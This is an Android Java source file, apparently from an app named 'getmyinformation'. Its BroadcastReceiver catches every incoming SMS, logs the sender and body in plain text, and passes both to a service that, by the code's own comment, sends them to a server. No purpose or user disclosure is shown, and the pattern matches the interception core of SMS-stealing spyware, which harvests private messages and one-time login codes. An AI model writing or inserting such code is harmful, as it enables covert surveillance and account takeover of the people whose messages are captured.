package com.example.getmyinformation;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        // Verify the action to ensure it's the expected broadcast
        if (intent != null && SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = createSmsMessageFromPdu(pdu, bundle);
                        if (smsMessage != null) {
                            String sender = smsMessage.getOriginatingAddress();
                            String message = smsMessage.getMessageBody();

                            Log.d(TAG, "Sender: " + sender + ", Message: " + message);

                            // Start the service to send SMS data to the server
                            Intent serviceIntent = new Intent(context, SmsService.class);
                            serviceIntent.putExtra("sender", sender);
                            serviceIntent.putExtra("message", message);
                            context.startService(serviceIntent);
                        }
                    }
                }
            }
        } else {
            Log.e(TAG, "Received unexpected intent action: " + (intent != null ? intent.getAction() : "null"));
        }
    }

    private SmsMessage createSmsMessageFromPdu(Object pdu, Bundle bundle) {
        SmsMessage smsMessage = null;
        try {
            String format = bundle.getString("format");
            smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
        } catch (Exception e) {
            Log.e(TAG, "Error creating SMS message from PDU: ", e);
        }
        return smsMessage;
    }
}
